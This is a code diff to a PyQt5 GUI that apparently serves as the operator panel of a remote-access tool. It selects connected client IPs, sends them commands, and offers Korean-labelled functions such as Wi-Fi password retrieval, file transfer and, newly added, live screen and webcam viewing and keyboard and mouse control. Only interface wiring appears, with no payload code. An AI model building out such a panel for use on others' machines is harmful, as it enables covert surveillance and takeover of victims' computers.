@@ -1,10 +1,12 @@
 from PyQt5.QtGui import QIcon
 from PyQt5.QtWidgets import (QDialog, QMainWindow, QApplication, QVBoxLayout, QHBoxLayout, QMenuBar,
-                            QListWidget, QLabel, QPushButton, QPlainTextEdit, QLineEdit,QGroupBox, QGridLayout, QWidget)
+                            QListWidget, QLabel, QPushButton, QPlainTextEdit, QLineEdit,QGroupBox, QGridLayout, QWidget, QMessageBox)
 from PyQt5.QtCore import Qt, pyqtSlot, QObject, pyqtSignal, QRunnable, QThreadPool
 import sys
+import os
 import time
 import traceback
+import qdarkstyle
 
 class Window(QWidget):
     def __init__(self, server):
@@ -21,12 +23,9 @@ class Window(QWidget):
         self.threadpool = QThreadPool()
         self.InitUI()
         self.server = server
+        self.server.App.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())
 
-        
-    def test(self, progress_callback):
-        while True:
-            print("hi")
-            time.sleep(10)
+
     def InitUI(self):
         #self.menuBar = QMenuBar(self)
         #fileMenu = self.menuBar.addMenu("File")
@@ -74,6 +73,9 @@ class Window(QWidget):
         self.getWifiPwBtn = QPushButton("Wifi 비번 구하기", self)
         self.sendMsgBtn = QPushButton("메세지 보내기", self)
         self.sendMsgBtn.clicked.connect(self.send_message)
+        self.liveStreamBtn = QPushButton("라이브 스크린 & 캠")
+        self.sendKeyBtn = QPushButton("키보드 제어")
+        self.sendMouseBtn = QPushButton("마우스 제어")
         
         self.func_gridLayout.addWidget(self.fileUploadBtn, 0, 0)
         self.func_gridLayout.addWidget(self.fileDownloadBtn, 0, 1)
@@ -81,6 +83,9 @@ class Window(QWidget):
         self.func_gridLayout.addWidget(self.runBrowserBtn, 1, 0)
         self.func_gridLayout.addWidget(self.getWifiPwBtn, 1, 1)
         self.func_gridLayout.addWidget(self.sendMsgBtn, 1, 2)
+        self.func_gridLayout.addWidget(self.liveStreamBtn, 2, 0)
+        self.func_gridLayout.addWidget(self.sendKeyBtn, 2, 1)
+        self.func_gridLayout.addWidget(self.sendMouseBtn, 2, 2)
 
         self.func_group.setLayout(self.func_gridLayout)
 
@@ -112,6 +117,7 @@ class Window(QWidget):
             self.ip_list.clear()
             self.ip_list.addItems(ips)
             self.ip_list.addItem("")
+
             if not self.cur_ip in ips:
                 self.textarea.clear()
                 self.append_message(f"[!] 연결된 ip가 없습니다\n새로운 ip를 선택해주세요\n")
@@ -144,16 +150,16 @@ class Window(QWidget):
         command = self.commandLine.text()
         self.commandLine.clear()
         if self.cur_ip:
-            self.append_message(command + "\n")
+            self.textarea.insertPlainText(command + "\n")
             server.control(command)
         else:
             self.append_message(f"ip를 먼저 선택하고 명령어를 입력해주세요 :: {command}\n")
+        self.textarea.verticalScrollBar().setValue(self.textarea.verticalScrollBar().maximum())
 
     @pyqtSlot()
     def append_message(self, message):
         """ 메세지를 추가함 """
-        self.textarea.insertPlainText(message) # insert vs append "\n"이 없냐 있냐 차이
-        # self.all_text[self.cur_ip] += message
+        self.textarea.appendPlainText(message) # insert vs append "\n"이 없냐 있냐 & 자동 스크롤이 안되냐 되냐 차이
         self.textarea.viewport().update()
 
 
@@ -163,12 +169,16 @@ class Window(QWidget):
         if self.cur_ip:
             self.all_text[self.cur_ip] = ""
 
+    def appear_msgbox(self, title, msg):
+        QMessageBox.about(self, title, msg)
+
+
 
 class WorkerSignals(QObject):
     finished = pyqtSignal()
     error = pyqtSignal(tuple)
-    result = pyqtSignal(object)
-    progress = pyqtSignal(int)
+    result = pyqtSignal(list)
+    progress = pyqtSignal(str)
 
 
 class Worker(QRunnable):
@@ -186,11 +196,6 @@ class Worker(QRunnable):
 
     @pyqtSlot()
     def run(self):
-        '''
-        Initialise the runner function with passed args, kwargs.
-        '''
-
-        # Retrieve args/kwargs here; and fire processing using them
         try:
             result = self.fn(*self.args, **self.kwargs)
         except:
@@ -201,28 +206,3 @@ class Worker(QRunnable):
             self.signals.result.emit(result)  # Return the result of the processing
         finally:
             self.signals.finished.emit()  # Done
-        
-
-
-# App = QApplication(sys.argv)
-# window = Window()
-# sys.exit(App.exec())
-
-# def progress_fn(self, n):
-#     print("%d%% done" % n)
-#
-# def execute_this_fn(self, progress_callback):
-#     for n in range(0, 5):
-#         time.sleep(1)
-#         progress_callback.emit(n * 100 / 4)
-#
-#     return "Done."
-#
-# def print_output(self, s):
-#     print(s)
-#
-# def thread_complete(self):
-#     print("THREAD COMPLETE!")
-# worker.signals.result.connect(self.print_output)
-# worker.signals.finished.connect(self.thread_complete)
-# worker.signals.progress.connect(self.progress_fn)
